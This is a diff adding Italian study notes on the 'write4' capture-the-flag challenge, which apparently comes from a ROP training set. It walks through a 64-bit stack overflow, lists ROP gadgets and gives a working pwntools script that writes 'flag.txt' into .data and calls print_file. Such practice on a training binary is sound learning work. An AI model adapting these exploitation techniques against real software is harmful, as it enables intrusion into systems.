@@ -94,4 +94,61 @@
   print(p.recvall())
   
   =>ROPE{a_placeholder_32byte_flag!}
+
+
+3)write4
+  C'è una funzione print_file() che ovviamente ci interessa!
+  Il testo afferma che la stringa "/bin/cat flag.txt" non è presente questa volta;
+  Un'idea potrebbe essere memorizzarla in un'area di memoria adatta per le variabili (.data)
   
+  gdb -> info files -> 0x0000000000601028 - 0x0000000000601038 is .data
+  a) buffer overflow (architettura 64 bit)
+  
+  	buffer[32]
+  	RBP -> 8 B
+  	RSP
+  	RIP
+  	=>garbage= b'A'*40
+  
+  b) abbiamo bisogno di memorizzare la variabile "/bin/cat flag.txt" in un'area di memoria da noi scelta
+  	quindi avremo bisogno di un gadget del tipo mov [ptr], reg
+  	
+  	=>0x0000000000400628 : mov qword ptr [r14], r15 ; ret
+  
+  c)abbiamo bisogno di un gadget che mi metta i valori nei registri appena trovati
+  	ROPgadget --binary "./write4" | grep "pop"
+  	=>0x0000000000400690 : pop r14 ; pop r15 ; ret
+  	
+  d) abbiamo bisogno dei valori da mettere:
+  	r14 => 0x0000000000601030 
+  	r15=> b"/bin/cat flag.txt"
+  	
+  e)necessitiamo del gadget ret per riallineare lo stack
+  	ROPgadget --binary "./write4" | grep "ret"
+  	=>0x00000000004004e6 : ret
+  	
+  f)indirizzo funzione print_file
+  	0x0000000000400510
+  	
+  g) gadget parametri funzione print_file
+  	0x0000000000400693 : pop rdi ; ret
+  
+  
+  from pwn import *
+  p=process('./write4')
+  garbage= b'A'*40
+  gadget_pop=p64(0x0000000000400690) #pop r14 ; pop r15 ; ret
+  value1=p64(0x0000000000601030)
+  value2=b"flag.txt"
+  gadget_mov=p64(0x0000000000400628) #mov qword ptr [r14], r15 ; ret
+  target=p64(0x0000000000400510)
+  align=p64(0x00000000004004e6) 
+  gadget_rdi=p64(0x0000000000400693)#pop rdi ; ret
+  payload= garbage +align + gadget_pop + value1 + value2 + gadget_mov
+  #la funzione print_file ha un solo registro prendiamo pop rdi
+  payload+= gadget_rdi + value1 + target
+  p.sendline(payload)
+  print(p.recvall())
+  
+  =>ROPE{a_placeholder_32byte_flag!}
+    
